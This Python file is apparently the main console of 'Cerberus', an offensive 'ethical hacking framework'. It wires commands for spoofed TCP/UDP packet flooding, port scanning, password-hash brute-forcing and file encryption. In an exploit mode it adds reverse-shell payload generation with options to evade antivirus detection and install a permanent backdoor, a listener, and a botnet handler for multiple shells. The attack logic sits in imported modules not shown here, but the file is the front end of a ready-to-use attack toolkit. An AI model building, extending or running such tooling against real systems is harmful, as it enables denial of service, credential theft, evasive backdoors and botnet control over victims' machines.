# Importing dependencies

import threading
import itertools
import hashlib
import string
import socket
import time
import sys
import os

# Importing / Downloading colorama

try:
    import colorama
except:
    os.system('python3 -m pip install colorama')
    import colorama

# Title

console = "default"

colorama.init()

def load_cerberus():
    
    logo = """\033[31m


          _     
        /\ \    
       /  \ \   
      / /\ \ \  
     / / /\ \ \ 
    / / /  \ \_\\
   / / /    \/_/
  / / /         
 / / /________  
/ / /_________\\
\/____________/


    \033[39m"""

    for line in logo.split("\n"):
        print(" " * 12 + line)

    print(f"\033[36m     - - = [\033[33m  Cerberus v1.3.0  \033[36m] = - -\n\033[39m")

    print(f"\033[36m         < +-------------------+ >\033[39m")
    print(f"\033[36m           |\033[31m      ETHICAL      \033[36m|\033[39m")
    print(f"\033[36m           |\033[31m                   \033[36m|\033[39m")
    print(f"\033[36m           |\033[31m      HACKING      \033[36m|\033[39m")
    print(f"\033[36m           |\033[31m                   \033[36m|\033[39m")
    print(f"\033[36m           |\033[31m     FRAMEWORK     \033[36m|\033[39m")
    print(f"\033[36m         < +-------------------+ >\033[39m")

    print(f"\n\033[36m author: \033[33mGilbert Enevoldsen\033[39m")
    print(f"\033[36m github: \033[33mhttps://github.com/GilbertEnevoldsen/Cerberus\033[39m\n\n\n")

load_cerberus()

# Functions

import global_variables

from flood import *
from scanner import *
from cracker import *
from payloads import *
from listen import *
from botnet_handler import *
from encrypter import *

# Console

while True:

    if console == "default":

        print(f"\033[34m Cerberus (\033[36m-\033[34m) -> \033[33m", end="")
        command = input().split(' ')
        
        print("\033[39m", end="")

        if command[0] == "help":
            
            if len(command) == 2:
                
                if command[1] == "flood":
                    
                    print()
                    print(" COMMAND USAGE")
                    print(" =============")
                    print(" flood [-target <target ip>] [-port <port>] [-spoof <spoofed ip>]")
                    print("       [-delay <delay>] [-method <method>] [-threads <threads>]")
                    print("       [-duration <duration>]")
                    print()
                    print(" ARGUMENTS")
                    print(" =========")
                    print(" target       ip address of target machine")
                    print(" port         port to send packets through")
                    print(" spoof        ip address to spoof packets from")
                    print(" delay        delay between packets")
                    print(" method       packet method")
                    print("              tcp udp")
                    print(" threads      number of threads")
                    print(" duration     duration of the attack")
                    print()

                if command[1] == "scan":
                    
                    print()
                    print(" COMMAND USAGE")
                    print(" =============")
                    print(" scan [-target <target ip>]")
                    print()
                    print(" ARGUMENTS")
                    print(" =========")
                    print(" target     ip address of the target machine")
                    print()
                
                if command[1] == "crack":
                    
                    print()
                    print(" COMMAND USAGE")
                    print(" =============")
                    print(" crack [-password <hash>] [-file <file>] [-presalt <salt>]")
                    print("       [-sufsalt <salt>] [-iterations <iterations>] [-algorithm <hashing alogrithm>]")
                    print("       [-charpool <charpool>] [-wordlist <wordlist file>] [-out <path>]")
                    print()
                    print(" ARGUMENTS")
                    print(" =========")
                    print(" password       hashed password to crack")
                    print(" file           file with hashed passwords")
                    print(" presalt        prefix salt")
                    print(" sufsalt        suffix salt")
                    print(" iterations     how many times the algorithm will be iterated")
                    print(" algorithm      hashing algorithm used to hash the passwords")
                    print("                sha1 sha224 sha256 sha384 sha512 blake2b blake2s md5")
                    print(" charpool       characters to try bruteforcing with")
                    print("                if not defined it will use lowercase, uppercase, digits, special characters")
                    print(" wordlist       list of plain passwords to use to crack")
                    print(" out            output path")
                    print()

                if command[1] == "encrypt":
                    
                    print()
                    print(" COMMAND USAGE")
                    print(" =============")
                    print(" encrypt [-file <file>] [-key <key>]")
                    print()
                    print(" ARGUMENTS")
                    print(" =========")
                    print(" file     file to encrypt / decrypt")
                    print(" key      32 character key")
                    print("          encrypt an encrypted file with the same key and it gets decrypted")
                    print("          if no key specified a key will be generated")
                    print()
            
            else:

                print()
                print(" COMMAND      DESCRIPTION")
                print(" =======      ===========")
                print(" help         displays functionality and usage of every command")
                print("              you can use help <command> to get information on some commands")
                print(" exit         exits the program")
                print(" clear        clears the screen")
                print(" flood        floods an address with packets")
                print(" scan         scans an address for open ports")
                print(" crack        bruteforceses hashed passwords")
                print(" encrypt      encrypt / decrypt a file with symmetric encryption")
                print(" exploit      puts console into exploit mode")
                print()

        if command[0] == "exit":

            break

        if command[0] == "clear":

            if os.name == 'posix': os.system('clear')
            else:  os.system('cls')
            print()
        
        if command[0] == "flood":
            
            try:

                target = command[command.index("-target") + 1]
                port = int(command[command.index("-port") + 1])
                spoof = command[command.index("-spoof") + 1]
                delay = int(command[command.index("-delay") + 1])
                method = command[command.index("-method") + 1]
                duration = int(command[command.index("-duration") + 1])

                number_of_threads = 1

                global_variables.request_index = 0
                global_variables.attack_running = True

                if "-threads" in command:
                    number_of_threads = int(command[command.index("-threads") + 1])

                print("\033[36m [*] flooding\033[39m")

                for thread_index in range(number_of_threads):

                    try:
                        
                        thread = threading.Thread(target=flood, args=[target, port, spoof, delay, method])
                        thread.start()
                        
                    except:
                        
                        pass

                time.sleep(duration)

                global_variables.attack_running = False
                
                thread.join()

                print(f"\n finished with {global_variables.request_index} requests made")
                print()
                        
            except:
                
                print("\033[31m\n [!] command error\033[39m\n")
            
            
                    
        if command[0] == "scan":
        
            try:
        
                target = command[command.index("-target") + 1]
        
                scan_address(target)
        
            except:
                
                print("\033[31m\n [!] command error\033[39m\n")
        
        if command[0] == "crack":
            
            try:
                
                presalt = ""
                sufsalt = ""
                iterations = 1
                charpool = None
        
                if "-password" in command: password = command[command.index("-password") + 1]
                else: file = command[command.index("-file") + 1]
                if "-presalt" in command: presalt = command[command.index("-presalt") + 1]
                if "-sufsalt" in command: sufsalt = command[command.index("-sufsalt") + 1]
                if "-iterations" in command: iterations = command[command.index("-iterations") + 1]
                algorithm = command[command.index("-algorithm") + 1]
                if "-charpool" in command: charpool = command[command.index("-charpool") + 1]
                if "-wordlist" in command: wordlist = command[command.index("-wordlist") + 1]
                if "-out" in command: out = command[command.index("-out") + 1]
                
                if "-password" in command:

                    passwords = [password]

                else:
                    
                    with open(file, 'r') as file: passwords = file.read().split("\n")
                    passwords = [i for i in passwords if i]
                    
                if not "-wordlist" in command: wordlist = None
                else:
                    with open(wordlist) as file: wordlist = file.read().split("\n")
                    wordlist = [i for i in wordlist if i]
                    
                if not "-out" in command: out = None
                
                crack(passwords, presalt, sufsalt, iterations, algorithm, charpool, wordlist, out)
                
                print()

            except:

                print("\033[31m\n [!] command error\033[39m\n")

        if command[0] == "encrypt":
            
            try:
            
                key = None
                
                file = command[command.index("-file") + 1]
                if "-key" in command: key = command[command.index("-key") + 1]
            
                encrypt(file, key)
            
            except:
                
                print("\033[31m\n [!] command error\033[39m\n")

        if command[0] == "exploit":

            console = "exploit"
            print()
        
    if console == "exploit":

        print(f"\033[34m Cerberus (\033[31mExploit\033[34m) -> \033[33m", end="")
        command = input().split(' ')
        
        print("\033[39m", end="")

        if command[0] == "help":
            
            if len(command) == 2:
                
                if command[1] == "payload":
                    
                    print()
                    print(" COMMAND USAGE")
                    print(" =============")
                    print(" payload [-host <host ip>] [-port <port>] [-random]")
                    print("         [-junk <bytes>] [-persistance] [-out <path>]")
                    print()
                    print(" ARGUMENTS")
                    print(" =========")
                    print(" host            ip address of the host machine")
                    print(" port            port to open connection")
                    print(" random          randomizes the payload to bypass detection")
                    print(" junk            adds junk data to increase size to bypass detection")
                    print(" persistance     automaticly creates a permanent backdoor")
                    print(" out             output path")
                    print()
                
                if command[1] == "listen":
                    
                    print()
                    print(" COMMAND USAGE")
                    print(" =============")
                    print(" payload [-host <host ip>] [-port <port>]")
                    print()
                    print(" ARGUMENTS")
                    print(" =========")
                    print(" host          ip address of the host machine")
                    print(" port          port which to listen for connections")
                    print()
                
                if command[1] == "botnet":
                    
                    print()
                    print(" COMMAND USAGE")
                    print(" =============")
                    print(" botnet [-host <host ip>] [-port <port>]")
                    print()
                    print(" ARGUMENTS")
                    print(" =========")
                    print(" host     ip address of the host machine")
                    print(" port     port which to listen for connections")
                    print()
            
            else:

                print()
                print(" COMMAND     DESCRIPTION")
                print(" =======     ===========")
                print(" help        displays functionality and usage of every command")
                print("             you can use help <command> to get information on some commands")
                print(" exit        exits the program")
                print(" clear       clears the screen")
                print(" payload     generates a payload")
                print(" listen      listens for incoming reverse shell connections")
                print(" botnet      allows for multiple reverse shell handling")
                print(" back        returns console to normal mode")
                print()

        if command[0] == "exit":

            break
        
        if command[0] == "clear":

            if os.name == 'posix': os.system('clear')
            else:  os.system('cls')
            print()
            
        if command[0] == "payload":

            try:

                randomize = False
                junk = 0
                persistance = False

                host = command[command.index("-host") + 1]
                port = command[command.index("-port") + 1]
                if "-random" in command: randomize = True
                if "-junk" in command: junk = int(command[command.index("-junk") + 1])
                if "-persistance" in command: persistance = True
                out = command[command.index("-out") + 1]

                print("\033[36m [*] generating payload\033[39m")

                generate_shell_payload(host, port, randomize, junk, persistance, out)

                print("\033[36m [*] payload generated\033[39m")
                print()
            
            except:
                
                print("\033[31m\n [!] command error\033[39m\n")
        
        if command[0] == "listen":
            
            try:
            
                host = command[command.index("-host") + 1]
                port = int(command[command.index("-port") + 1])
                
                print("\033[36m [*] listening for connections\033[39m")
                
                listen_for_connections(host, port)
                    
            except:
                
                print("\033[31m [!] command error\033[39m\n")
        
        if command[0] == "botnet":
            
            try:
            
                host = command[command.index("-host") + 1]
                port = int(command[command.index("-port") + 1])
                
                botnet_handler(host, port)
            
            except:
                
                print("\033[31m\n [!] command error\033[39m\n")
        
        if command[0] == "back":

            console = "default"
            print()